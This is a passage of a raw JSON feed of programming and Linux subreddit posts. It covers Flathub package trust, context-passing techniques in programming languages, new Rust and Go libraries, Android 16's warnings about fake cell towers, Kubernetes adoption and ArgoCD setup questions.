FlatHub packages?","url":"https://www.reddit.com/r/linux/comments/1ln4knk/how_trustworthy_are_flathub_packages/","date":1751166476,"author":"/u/we_are_mammals","guid":174888,"unread":true,"content":"<p>Take Chrome, for example. FlatHub says it's \"by Google\", but also \"Unverified\" and \"Not supported by Google\". Then who is uploading / packaging it? Who am I trusting, if I use it?</p><p>I like the additional layer of security and control that bubblewrap / flatpak provide, but I don't like having to trust some (unknown, to me, as of this writing) third parties not to screw up or trojan the binaries...</p>","contentLength":396,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How to pass the invisible","url":"https://hackers.pub/@hongminhee/2025/how-to-pass-the-invisible","date":1751165119,"author":"/u/hongminhee","guid":174840,"unread":true,"content":"<p>One of the enduring challenges in software programming is this: “How do we pass the invisible?” Loggers, HTTP request contexts, current locales, I/O handles—these pieces of information are needed throughout our programs, yet threading them explicitly through every function parameter would be unbearably verbose.</p><p>Throughout history, various approaches have emerged to tackle this problem. Dynamic scoping, aspect-oriented programming, context variables, and the latest effect systems… Some represent evolutionary steps in a continuous progression, while others arose independently. Yet we can view all these concepts through a unified lens.</p><p><a href=\"https://en.wikipedia.org/wiki/Scope_(computer_science)#Dynamic_scope\">Dynamic scoping</a>, which originated in 1960s Lisp, offered the purest form of solution. “A variable's value is determined not by where it's defined, but by where it's called.” Simple and powerful, yet it fell out of favor in mainstream programming languages after Common Lisp and Perl due to its unpredictability. Though we can still trace its lineage in JavaScript's  binding.</p><pre><code></code></pre><h2>Aspect-oriented programming </h2><p><a href=\"https://en.wikipedia.org/wiki/Aspect-oriented_programming\"></a> structured the core idea of “modularizing cross-cutting concerns.” The philosophy: “Inject context, but with rules.” By separating cross-cutting concerns like logging and transactions into aspects, it maintained dynamic scoping's flexibility while pursuing more predictable behavior. However, debugging difficulties and performance overhead limited its spread beyond Java and .NET ecosystems.</p><pre><code></code></pre><p>Context variables represent dynamic scoping redesigned for modern requirements—asynchronous and parallel programming. Python's <a href=\"https://docs.python.org/3/library/contextvars.html\"></a> and Java's <a href=\"https://docs.oracle.com/en/java/javase/24/docs/api/java.base/java/lang/ThreadLocal.html\"></a> exemplify this approach. Yet they still suffer from runtime dependency and the fact that API context requirements are only discoverable through documentation.</p><p>Another manifestation of context variables appears in React's <a href=\"https://react.dev/learn/passing-data-deeply-with-context\">contexts</a> and similar concepts in other UI frameworks. While their usage varies, they all solve the same problem: <a href=\"https://kentcdodds.com/blog/prop-drilling\">prop drilling</a>. Implicit propagation through component trees mirrors propagation through function call stacks.</p><pre><code></code></pre><p><a href=\"https://en.wikipedia.org/wiki/Monad_(functional_programming)\">Monads</a> approach this from a different starting point. Rather than implicit context passing, monads attempt to encode effects in the type system—addressing a more fundamental problem. The <a href=\"https://hackage.haskell.org/package/mtl/docs/Control-Monad-Reader.html#t:Reader\"></a> monad specifically corresponds to context variables. However, when combining multiple effects through <a href=\"https://en.wikipedia.org/wiki/Monad_transformer\">monad transformers</a>, complexity exploded. Developers had to wrestle with unwieldy types like <code>ReaderT Config (StateT AppState (ExceptT Error IO))</code>. Layer ordering mattered, each layer required explicit lifting, and usability suffered. Consequently, monadic ideas remained largely confined to serious functional programming languages like Haskell, Scala, and F#.</p><pre><code></code></pre><p><a href=\"https://en.wikipedia.org/wiki/Effect_system\">Effect systems</a> emerged to solve the compositional complexity of monads. Implemented in languages like <a href=\"https://koka-lang.github.io/\">Koka</a> and <a href=\"https://www.eff-lang.org/\">Eff</a>, they operate through algebraic effects and handlers. Multiple effect layers compose <em>without ordering constraints</em>. Multiple overlapping layers require no explicit lifting. Effect handlers aren't fixed—they can be dynamically replaced, offering significant flexibility.</p><p>However, compiler optimizations remain immature, interoperability with existing ecosystems poses challenges, and the complexity of effect inference and its impact on type systems present ongoing research questions. Effect systems represent the newest approach discussed here, and their limitations will be explored as they gain wider adoption.</p><pre><code></code></pre><p>The art of passing the invisible—this is the essence shared by all the concepts discussed here, and it will continue to evolve in new forms as an eternal theme in software programming.</p>","contentLength":3603,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1ln461k/how_to_pass_the_invisible/"},{"title":"Rate my lock screen","url":"https://www.reddit.com/r/linux/comments/1ln3p8v/rate_my_lock_screen/","date":1751163518,"author":"/u/LittleNinjaXYBA","guid":174841,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Releasing 0.5.0 of lfqueue - Lock-free MPMC queues","url":"https://www.reddit.com/r/rust/comments/1ln3fvm/releasing_050_of_lfqueue_lockfree_mpmc_queues/","date":1751162670,"author":"/u/Terikashi","guid":174839,"unread":true,"content":"<p>I've been working on a library for asynchronous signaling, something similar to tokio's  &amp; NeoSmart's  but for any asynchronous environment and more flexible. </p><p>The library has great performance characteristics, but it does get beat out by crossbeam's queues at high contention. I plan on optimizing it further to try to make it better than those two, but for now I wanted to release it and get it out there.</p><p>I would appreciate any thoughts/feedback, and I hope this can help with some projects. The library features a  option; and there are both array-allocated &amp; heap-allocated along with bounded &amp; unbounded variants of the queue.</p>","contentLength":630,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"heapcraft","url":"https://github.com/galactixx/heapcraft","date":1751160877,"author":"/u/SituationMiddle2932","guid":175366,"unread":true,"content":"<p>The Go standard library only has a very bare bones dary heap implementation, so I thought it may be of use to have a general-purpose heap library. Included are a variety of existing heap algorithms, including dary, radix, pairing, leftist, and skew.</p><p>These heaps include optional pooling and more comprehensive implementations of the tree-based heaps that have tracking of nodes in a map for quick retrieval. Coarse-grained thread-safe versions of each heap also exist.</p><p>Thanks for checking it out!</p>","contentLength":494,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1ln2vvk/heapcraft/"},{"title":"Android 16 can warn you that you might be connected to a fake cell tower -- \"Android 16's new \"network notification\" feature can potentially expose when your device is connected to a fake cell tower\"","url":"https://www.androidauthority.com/android-16-mobile-network-security-3571497/","date":1751160523,"author":"/u/throwaway16830261","guid":174812,"unread":true,"content":"<div data-container-type=\"content\"><ul><li>Android 16 is adding a new security feature that can warn you when your phone might be connected to a fake or insecure mobile network created by a “stingray” device.</li><li>This feature alerts you to unencrypted connections or when the network requests your phone’s identifiers, which can help detect when surveillance might be happening.</li><li>Due to new hardware requirements, this protection will likely only be on new devices launching with Android 16, such as the upcoming Pixel 10.</li></ul></div><div><p>There are many simple things you can do to keep your private information safe, like using strong passwords, scrutinizing app permissions, and only installing apps from trusted sources. However, some attacks are much harder to protect yourself against, as they’re so sophisticated and stealthy that they can happen without you ever noticing. One such attack tricks your phone into connecting to a fake, insecure mobile network, which is difficult for the average person to detect. Fortunately, the new <a href=\"https://www.androidauthority.com/android-16-review-3566047/\">Android 16</a> update has a feature that might be able to warn you when someone is using this tactic to snoop on you.</p></div><div><p>This type of attack uses a device called a “stingray.” An attacker sets up this device near a target they want to surveil, and it mimics a legitimate cell tower. The stingray tricks nearby mobile devices into connecting to it, allowing the attacker to collect unique identifiers (like the IMEI) and even force them onto an older, more insecure communication protocol. These identifiers allow attackers to target specific devices for analysis, while switching protocols can let them intercept unencrypted text messages and phone calls.</p></div><div><p>These “stingray” devices are notoriously used by law enforcement agencies, but their technology can also be acquired by malicious actors. While some argue they are a necessary tool for surveilling criminals, their potential for abuse is significant, as they can be used to covertly collect data on ordinary people. Because of this, Google has been working on ways to warn Android users or prevent them from sending communications over insecure cellular networks.</p></div><div><p>With the release of <a href=\"https://www.androidauthority.com/android-12-features-1195735/\">Android 12</a>, for example, Google added support for disabling 2G connectivity at the modem level. In <a href=\"https://www.androidauthority.com/android-14-features-3280726/\">Android 14</a>, the company followed up by supporting the disabling of connections that use null ciphers — a form of unencrypted communication. More recently, <a href=\"https://www.androidauthority.com/android-15-features-3401939/\">Android 15</a> added support for notifying the OS when the network requests a device’s unique identifiers or tries to force a new ciphering algorithm. These features directly counter the tactics used by commercial “stingrays,” which trick devices into downgrading to 2G or using null ciphers to make their traffic easier to intercept. Blocking these connections and notifying the user about these requests helps protect them from surveillance.</p></div><div><p>Unfortunately, only one of these three features is widely available: the ability to disable 2G connectivity. The problem is that implementing these protections requires corresponding changes to a phone’s modem driver. The feature that notifies the OS about identifier requests, for example, requires a modem that supports version 3.0 of Android’s IRadio hardware abstraction layer (HAL). This dependency is why these <a href=\"https://www.androidauthority.com/android-15-mobile-network-security-pixel-3490909/\">security features are missing on current Pixel phones</a> and other devices, and it’s also likely why Google delayed launching the dedicated “mobile network security” settings page it planned for Android 15.</p></div><div><p>Since upcoming devices launching with Android 16 will support version 3.0 of Android’s IRadio HAL, Google is <a href=\"https://source.android.com/docs/security/features/cellular-security/mobile-network-security\" target=\"_blank\">reintroducing</a> the “” settings page in the Safety Center (<strong>Settings &gt; Security &amp; privacy</strong>). This page contains two subsections:</p><ul><li><ul><li>This subsection contains a “” toggle. When enabled, it allows the system to warn you if your device connects to an unencrypted network or when the network requests your phone’s unique identifiers. This toggle is disabled by default in Android 16.</li></ul></li><li><ul><li>This subsection features a “” toggle that enables or disables the device’s 2G connectivity. This is the same toggle found in the main SIM settings menu, and it is also disabled by default in Android 16.</li></ul></li></ul></div><div><p>The “Mobile network security” page will only appear on devices that support both the “2G network protection” toggle and the “network notifications” feature. This is why it doesn’t appear on any current Pixel devices running Android 16, as they lack the necessary modem support for the network notifications feature.</p></div><div><p>When the “Network notifications” feature is enabled, Android will post a message in the notification panel and the Safety Center whenever your device switches from an encrypted to an unencrypted network, or vice versa. It will also post an alert in both places when the network accesses your phone’s unique identifiers, detailing the time and number of times they were requested.</p></div><div><p>It’s worth noting that legitimate cellular networks do need to access your device’s unique identifiers from time to time, such as when your device reconnects to them after exiting airplane mode, so the network notifications do not prove malintent. Android has no way of actually knowing whether a cell tower is real or not, so it’s simply providing notice to the user and letting them decide whether they should take action.</p></div><div><p>Now that Google has relaunched this security page in Android 16, it won’t be long before we start seeing it on devices. However, due to the <a href=\"https://www.androidauthority.com/android-longevity-grf-3493006/\">Google Requirements Freeze (GRF)</a> program — a policy that allows OEMs to lock in hardware-related requirements for devices at launch — it’s unlikely that any current devices will be updated to support the notifications feature. We will most likely have to wait for upcoming devices that launch with Android 16, such as the <a href=\"https://www.androidauthority.com/google-pixel-10-3470386/\">Pixel 10</a> series, to see this protection fully implemented.</p></div><div data-container-type=\"content\">&nbsp;Email our staff at <a href=\"mailto:news@androidauthority.com\" rel=\"noopener noreferrer\" data-stringify-link=\"mailto:tips@androidauthority.com\" data-sk=\"tooltip_parent\" aria-haspopup=\"menu\">news@androidauthority.com</a>. You can stay anonymous or get credit for the info, it's your choice.</div><div><p><em>This article was updated at 6:04 PM ET to clarify that Android’s “network notifications” don’t serve as true indicators that the device is actually connected to a fake cell tower, but rather as warnings to the user that this could be happening.</em></p></div>","contentLength":6188,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1ln2rxo/android_16_can_warn_you_that_you_might_be/"},{"title":"Quill - Simple, 2D SVG plotting for Rust","url":"https://github.com/Ryan-D-Gast/quill","date":1751158163,"author":"/u/Sc2Ryan","guid":174935,"unread":true,"content":"<p>I built <a href=\"https://github.com/Ryan-D-Gast/quill\">quill</a> because I was unhappy with the current plotting options for creating simple, but great looking, 2D plots for examples or reports. I the other options for example Plotters had a difficult API for simple tasks and added dramatically to compilation times not to mention the majority of plotting libraries I found are meant for embedded or web applications. I built this mainly to serve as a .svg plot generator for my <a href=\"https://github.com/Ryan-D-Gast/differential-equations\">differential-equations</a> library's examples but I think this will be useful for others hence why I am sharing!</p><pre><code>use quill::*; let data = (0..=100).map(|x| { let xf = x as f64 * 0.1; (xf, xf.sin()) }).collect(); let plot = Plot::builder() .title(\"Sine Wave\".to_string()) .data(vec![ Series::builder() .name(\"sin(x)\".to_string()) .color(\"Blue\".to_string()) .data(data) .line(Line::Solid) .build(), ]) .build(); plot.to_svg(\"sine.svg\").unwrap(); </code></pre><p>Everything from gridlines to legends are modifiable using the builder pattern thanks to bon!</p><p>In the future I would like to add other chart types but for now only 2D Line/Scatter plots are supported.</p>","contentLength":1065,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1ln20nd/quill_simple_2d_svg_plotting_for_rust/"},{"title":"Showcase: Project Combiner (combine-files) - A CLI Tool Ideal for Prepping Context for LLMs","url":"https://pypi.org/project/project-combiner/","date":1751156160,"author":"/u/Sad_Fisherman_4605","guid":174789,"unread":true,"content":"<div role=\"alert\" aria-live=\"polite\">\n      A required part of this site couldn’t load. This may be due to a browser\n      extension, network issues, or browser settings. Please check your\n      connection, disable any ad blockers, or try using a different browser.\n    </div>","contentLength":235,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1ln1ddy/showcase_project_combiner_combinefiles_a_cli_tool/"},{"title":"Joint Force - Solve puzzles to reunite Belcho and Nim","url":"https://rocketnine.itch.io/jointforce","date":1751154926,"author":"/u/tslocum","guid":174763,"unread":true,"content":"<div><p>Click download now to get access to the following files:</p></div>","contentLength":56,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1ln0yn4/joint_force_solve_puzzles_to_reunite_belcho_and/"},{"title":"Joint Force - 2025 Ebitengine game jam entry","url":"https://rocketnine.itch.io/jointforce","date":1751152330,"author":"/u/tslocum","guid":174790,"unread":true,"content":"<div><p>Click download now to get access to the following files:</p></div>","contentLength":56,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1ln0322/joint_force_2025_ebitengine_game_jam_entry/"},{"title":"Solving `UK Passport Application` with Haskell","url":"https://jameshaydon.github.io/passport/","date":1751151783,"author":"/u/james_haydon","guid":174738,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lmzw5s/solving_uk_passport_application_with_haskell/"},{"title":"FieldX 0.2.0 released","url":"https://www.reddit.com/r/rust/comments/1lmyrpj/fieldx_020_released/","date":1751148579,"author":"/u/vrurg","guid":174787,"unread":true,"content":"<p>I'm proud to announce that after over a year of development my FieldX crate is sufficiently stabilized to move onto <a href=\"https://vrurg.github.io/fieldx/release-notes/v0.2.0.html\">the next minor version</a>!</p><p>What is it? I wasn't sure how to classify the crate and worked out a definition that is the best match so far: an object manager. Its purpose is, given a struct, to implement the boilerplate needed to provide some most used APIs. More details are in <a href=\"https://vrurg.github.io/fieldx/introduction.html\">the introduction chapter</a> of FieldX documentation, but to mention a few, briefly: accessors and setters, lazy field initialization, builder pattern, serialization, etc. Depending on user requirements the crate supports all concurrency modes: plain (or unsync), sync, async. </p><p>I wasn't targeting any particular use cases. A while ago someone asked me if this is about dependency injection (referring to the laziness), and I didn't have an answer back then. Now I can tell that FieldX can be used to implement a dependency manager; other way around, the inner dependency injection pattern is what one gets with the lazy field initialization. But this is only part of the story as FieldX works well for any kind of general application development and, hopefully, not only. At least it is based upon the experiences I had while working on other projects.</p><p>But first of all, I hope that the crate would spare hours of tedious boilerplate implementation to many fellow devs!</p><p>PS. If anyone could donate a good logo for the project I'd appreciate this a lot!</p>","contentLength":1433,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"When should you start using kubernetes","url":"https://www.reddit.com/r/kubernetes/comments/1lmy1ie/when_should_you_start_using_kubernetes/","date":1751146573,"author":"/u/techreclaimer","guid":174737,"unread":true,"content":"<p>I had a debate with an engineer on my team, whether we should deploy on kubernetes right from the start (him) or wait for kubernetes to actually be needed (me). My main argument was the amount of complexity that running kubernetes in production has, and that most of the features that it provides (auto scaling, RBAC, load balancing) are not needed in the near future and will require man power we don't have right now without pulling people away from other tasks. His argument is mainly about the fact that we will need it long term and should therefore not waste time with any other kind of deployment. I'm honestly not sure, because I see all these \"turnkey-like\" solutions to setup kubernetes, but I doubt they are actually turnkey for production. So I wonder what the difference in complexity and work is between container-only deployments (Podman, Docker) and fully fledged kubernetes? </p>","contentLength":892,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"whats the best framework to write unit tests","url":"https://www.reddit.com/r/golang/comments/1lmxpy8/whats_the_best_framework_to_write_unit_tests/","date":1751145683,"author":"/u/Sad_Flatworm6973","guid":175367,"unread":true,"content":"<div><p>I am practicing my golang skills by building a project and I am trying to find a good mature framework or library out there for unit tests, and recommendations?</p></div>   submitted by   <a href=\"https://www.reddit.com/user/Sad_Flatworm6973\"> /u/Sad_Flatworm6973 </a>","contentLength":199,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] NVIDIA acquires CentML — what does this mean for inference infra?","url":"https://www.reddit.com/r/MachineLearning/comments/1lmx6f9/d_nvidia_acquires_centml_what_does_this_mean_for/","date":1751144220,"author":"/u/pmv143","guid":174710,"unread":true,"content":"<p>CentML, the startup focused on compiler/runtime optimization for AI inference, was just acquired by NVIDIA. Their work centered on making single-model inference faster and cheaper , via batching, quantization (AWQ/GPTQ), kernel fusion, etc.</p><p>This feels like a strong signal: inference infra is no longer just a supporting layer. NVIDIA is clearly moving to own both the hardware and the software that controls inference efficiency.</p><p>That said, CentML tackled one piece of the puzzle , mostly within-model optimization. The messier problems : cold starts, multi-model orchestration, and efficient GPU sharing , are still wide open. We’re working on some of those challenges ourselves (e.g., InferX is focused on runtime-level orchestration and snapshotting to reduce cold start latency on shared GPUs).</p><p>Curious how others see this playing out. Are we headed for a vertically integrated stack (hardware + compiler + serving), or is there still space for modular, open runtime layers?</p>","contentLength":978,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Go is 80/20 language","url":"https://blog.kowalczyk.info/article/d-2025-06-26/go-is-8020-language.html","date":1751144154,"author":"/u/simon_o","guid":174684,"unread":true,"content":"<div>Go is the most hated programming language. Compared to other languages, it provides 80% of utility with 20% of complexity. The hate comes from people who want 81% of utility, or 85% or 97%.</div><div>As Rob Pike said, no one denies that 87% provides more utility than 80%. The problem is that additional 7% of utility requires 36% more work.</div><div>Someone complained on HN that  are a not as powerful as annotations or macros. I <a target=\"_blank\" href=\"https://news.ycombinator.com/item?id=44336234\">explained</a> that this is ⁄ design.</div><div>Go’s  in standard library is a couple hundred lines of code, didn’t change much over the years and yet it provides all the basic testing features you might need. It doesn’t provide all the convenience features you might think of. That’s what Java’s jUnit library does, at a cost of tens of thousands lines of code and years of never-ending development. Go is ⁄ design.</div><div> are ⁄ design for concurrency compared to async in C# or Rust. Not as many features and knobs but only a fraction of complexity (for users and implementors).</div><div>When Go launched it didn’t have user defined generics but the built-in types that needed it were <strong>generic: arrays/slices, maps, channels</strong>. That ⁄ design served Go well for over a decade.</div><div>Most languages can’t resist driving towards 100% design at 400% the cost. C#, Swift, Rust - they all seem on a never-ending treadmill of adding features. Even JavaScript, which started as a ⁄ language has been captured by people whose job became adding more features to JavaScript.</div><div>If ⁄ is good, wouldn’t ⁄ be even better? No, it wouldn’t. Go has shown that you can have a popular language without enums. I don’t think you could have a popular language without structs. There’s a line below which the language is just not useful enough.</div><div>Finally, what does “work” mean?</div><div>There’s  of the language. Every additional feature of the language requires the programmer to learn about it. It’s more work than it seems. If you make functions as first class concepts, the work is not just learning the syntax and functionality. You need to learn new patterns of coding, like functions that return functions. You need to learn about currying, passing functions as arguments. You need to learn not only  but also : when you should use that powerful functionality and when you shouldn’t.</div><div>You can’t skip that complexity. Even if you decide to not learn how to use functions as first class concepts, your co-worker might and you have to be able to understand his code. Or a useful library uses it or a tutorial talks about it.</div><div>That’s why 80+% languages need coding guidelines. Google <a target=\"_blank\" href=\"https://google.github.io/styleguide/cppguide.html\">has one for C++</a> because hundreds of programmers couldn’t effectively work on shared C++ codebase if there was no restriction on what features any individual programmer could use. Google’s C++ style guide exists to lower C++ from 95% language to 90% language.</div><div>The other  of the language. Swift is a cautionary tale here. Despite over 10 years of development by very smart people with practically unlimited budget, on a project that is a priority for Apple, Swift compiler is still slow, crashy and is not meaningfully cross platform.</div><div>They designed a language that they cannot implement properly. In contrast: Go, a much simpler but still very capable language, was fast, cross platform and robust from version 1.0.</div><ul><li>tweaked the design of this blog</li><li>yesterday I did a lot of changes to <a target=\"_blank\" href=\"https://edna.arslexis.io/\">Edna</a> to support folding of blocks, persisting that across sessions. I also refactored loading process. That means I might have broken things so today is testing those changes and if no major problems detected, deploying a new version</li></ul>","contentLength":3579,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lmx5ld/go_is_8020_language/"},{"title":"Rust in C# Org","url":"https://www.reddit.com/r/rust/comments/1lmvndq/rust_in_c_org/","date":1751140110,"author":"/u/Forward_Dark_7305","guid":174788,"unread":true,"content":"<p>I’ve only barely used rust - mostly was just curious to learn about it. I realized though I love the language. The self-contained-ness of it (no dotnet runtime), the functional style, the borrow system.</p><p>I work in a school district IT department. We don’t do a ton of programming so I’d consider myself the sort of primary programmer, and one other has some side projects too. We’re pretty much migrated to C# now, with a few NodeJS projects remaining plus our web front end code.</p><p>The other programmer and I are pretty firmly rooted in C#. We have a couple guys doing some automations in Python and PowerShell, plus two others that are familiar with C# but don’t really write anything. (Also we are a windows org.) Most of our applications are dockerized daemons or services - very few deployed on our client machines.</p><p>I’d like some honest opinions about whether it would be valuable to write greenfield projects with Rust on account of its benefits, or if you think I should stick with C# because it’s the “standard” between me and the other developer.</p>","contentLength":1067,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Subreddit Policies In Response To AI","url":"https://www.reddit.com/r/golang/comments/1lmvg4s/subreddit_policies_in_response_to_ai/","date":1751139580,"author":"/u/jerf","guid":174657,"unread":true,"content":"<p>In response to <a href=\"https://www.reddit.com/r/golang/comments/1ljvq23/this_subreddit_is_getting_overrun_by_ai_spam/\">recent community outcry</a>, after looking at the votes and pondering the matter for a while, I have come up with these changes for the Go subreddit.</p><p>As we are all feeling our way through the changes created by AI, please bear in mind that</p><ol><li>These are not set in stone; I will be reading every reply to this post and may continue to tweak things in response to the community and</li><li>I'd rather take the time to turn up enforcement slowly and get a feel for it than break the community with harsh overenforcement right away, so, expect that.</li></ol><ul><li>Automod will remove any posts with emojis in them, with a link to that page.</li><li>The subreddit rule (in new Reddit) for AIs has been updated to reflect this new policy. You can report things with this rule and it'll be understood as the appropriate sort of slop based on context.</li></ul><p>I ask for your grace as we work through this because it's guaranteed we're going to disagree about where the line is for a while. I'll probably start by posting warnings and links to the guidance document rather than remove the questionable things and we'll see how that goes to start with.</p>","contentLength":1106,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Can AI run a physical shop? Anthropic’s Claude tried and the results were gloriously, hilariously bad","url":"https://www.reddit.com/r/artificial/comments/1lmvfp2/can_ai_run_a_physical_shop_anthropics_claude/","date":1751139547,"author":"/u/Hot_War_3615","guid":174655,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/Hot_War_3615\"> /u/Hot_War_3615 </a>","contentLength":35,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"NeetCode-150 YT walkthrough: Solving LeetCode Problems","url":"https://youtube.com/playlist?list=PLX2EBJHYctwiJOYqCNsN44n03mx1DRwck&amp;si=3OU2kPpA0xnS6i1e","date":1751138061,"author":"/u/Background_Yogurt846","guid":174653,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lmuvoj/neetcode150_yt_walkthrough_solving_leetcode/"},{"title":"Daily reminder to set MSRV for your project or library!","url":"https://www.reddit.com/r/rust/comments/1lmueb3/daily_reminder_to_set_msrv_for_your_project_or/","date":1751136837,"author":"/u/synalice","guid":174709,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/synalice\"> /u/synalice </a>","contentLength":31,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What Would Make an Automation Script Toolkit Truly Awesome? Seeking Ideas for Improvements for my Open Source Project","url":"https://www.reddit.com/r/linux/comments/1lmtt83/what_would_make_an_automation_script_toolkit/","date":1751135329,"author":"/u/capitanturkiye","guid":174997,"unread":true,"content":"<p>I built a command center while ago, a set of Shell scripts meant to be your all in one automation command center for system administration, development, and DevOps. Just clone the repo and you are ready to go, no extra dependencies or complicated setup required</p><p>But here is the thing I want this project to actually help real people like you and me. If you have ever felt annoyed by repetitive tasks or wished you had a magic tool to handle your daily sysadmin or DevOps headaches, I want to hear from you</p><p>What would make a toolkit like this genuinely useful in your workflow Are there specific scripts or features you wish existed but have never found Would you prefer a menu, simple commands, or something else entirely Do you know any neat tricks or best practices for Bash or Shell scripting</p><p>Every suggestion is welcome, whether it is about features, structure, documentation, or totally new ideas. If you want to share your pain points or even contribute, that would be amazing</p><p>Thanks for reading, and I look forward to your thoughts</p>","contentLength":1034,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"imgui-go v5","url":"https://www.reddit.com/r/golang/comments/1lmtpof/imguigo_v5/","date":1751135076,"author":"/u/JetSetIlly","guid":174656,"unread":true,"content":"<p>Despite it not being updated recently, it still works great. But it has long since drifted from the underlying C library it is based on. The underlying C library is Dear Imgui.</p><p>Dear Imgui is a very popular GUI library written in C++. Its popularity means that it is under constant development and new features are added often. It has therefore, unsurprisingly, changed significantly since imgui-go was last updated. I wanted some of the new features to be available in my Go applications so I've decided to fork the project and make the required changes myself.</p><p>This project definitely isn't for everyone but it might be of interest to users of the original inkyblackness project. If anyone does still need this project, I'm happy to accept pull-requests to fill in the missing pieces.</p><p>I should also mention cimgui-go, which is an alternative solution for bringing Dear Imgui to Go. I've looked at cimgui-go and I can see that it's a great solution and probably a better choice if you're starting a new GUI project. However, it's not a good solution for my needs at this time.</p>","contentLength":1073,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Anyone else having issues installing argoCD","url":"https://www.reddit.com/r/kubernetes/comments/1lmto7t/anyone_else_having_issues_installing_argocd/","date":1751134971,"author":"/u/__vlad_","guid":175094,"unread":true,"content":"<p>I've been trying to install argoCD, since yesterday. I'm following the installation steps in the documentation but when i run \"kubectl apply -n argocd -f <a href=\"https://raw.githubusercontent\">https://raw.githubusercontent</a>\" it doesn't download and i get a timeout error, anyone else experiencing this?</p>","contentLength":262,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I'm planning to learn Kubernetes along with Argo CD, Prometheus, Grafana, and basic Helm (suggestion)","url":"https://www.reddit.com/r/kubernetes/comments/1lmszc7/im_planning_to_learn_kubernetes_along_with_argo/","date":1751133215,"author":"/u/Zestyclose-Squash678","guid":174651,"unread":true,"content":"<p>I'm planning to learn Kubernetes along with Argo CD, Prometheus, Grafana, and basic Helm.</p><p>One is to join a small batch (maximum 3 people) taught by someone who has both certificaaations. He will cover everything — Kubernetes, Argo CD, Prometheus, Grafana, and Helm.</p><p>The other option is to learn only Kubernetes from a guy who calls himself a \"Kubernaut.\" He is available and seems enthusiastic, but I’m not sure how effective his teaching would be or whether it would help me land a job.</p><p>Which option would you recommend? My end goal is to switch roles and get a higher-paying job.</p><p>Edit : I know Kubernetes at a beginner level, and I took the KodeKloud course — it was good. But my intention is to learn Kubernetes at an expert or real-time level, so that in interviews I can confidently say I’ve worked on it and ask for the salary I want. </p>","contentLength":845,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Help on my (FOSS) VSCode/Sublime Text Find/Replace-in-files++ tool","url":"https://www.reddit.com/r/linux/comments/1lmsyqr/help_on_my_foss_vscodesublime_text/","date":1751133173,"author":"/u/Front-Independence40","guid":174739,"unread":true,"content":"<p>I've been at this for about a year. I wonder if any Developer types here would be up for the challenge of helping me port this to Linux.</p><p>The app is a standalone file text search tool aimed at improving find/replace in files across many IDE's. Currently Windows only as that's all that I have setup.</p><p>Using Avalonia/C# .Net 8.0 means cross platform is built in. There's likely a small handful of code adjustments and things to get it running and then some deployment details as well as Extension plugin updates for VSCode,Sublime Text,Visual Studio to get it working in its full glory. </p><p>It's called Blitz Search I'll post links in comments.</p>","contentLength":635,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Let's make a game! 280: Checking for death","url":"https://www.youtube.com/watch?v=ioEVYKbr5_4","date":1751129388,"author":"/u/apeloverage","guid":174575,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lmrgia/lets_make_a_game_280_checking_for_death/"},{"title":"Argocd fails to create Helm App from multiple sources","url":"https://www.reddit.com/r/kubernetes/comments/1lmrab5/argocd_fails_to_create_helm_app_from_multiple/","date":1751128945,"author":"/u/Eldiabolo18","guid":175095,"unread":true,"content":"<p>I'm dabbeling with Argocd and have an issue I dont quite understand. </p><p>I have deployed an an App (cnpg-operator) with multiple sources. Helm repo from upstream and values-file in a private git repo.</p><p><code>yaml apiVersion: argoproj.io/v1alpha1 kind: Application metadata: name: cnpg-operator namespace: argocd spec: project: default destination: server: https://kubernetes.default.svc namespace: cnpg-system sources: - chart: cnpg/cloudnative-pg repoURL: https://cloudnative-pg.github.io/charts targetRevision: 0.24.0 helm: valueFiles: - $values/values/cnpg-operator/values.yaml - repoURL: git@&lt;REPOURL&gt;:demo/argocd-demo.git targetRevision: HEAD ref: values syncPolicy: syncOptions: # Sync options which modifies sync behavior - CreateNamespace=true </code></p><p>When applying the I get (in the GUI):</p><blockquote><p>Failed to load target state: failed to generate manifest for source 1 of 2: rpc error: code = Unknown desc = error fetching chart: failed to fetch chart: failed to 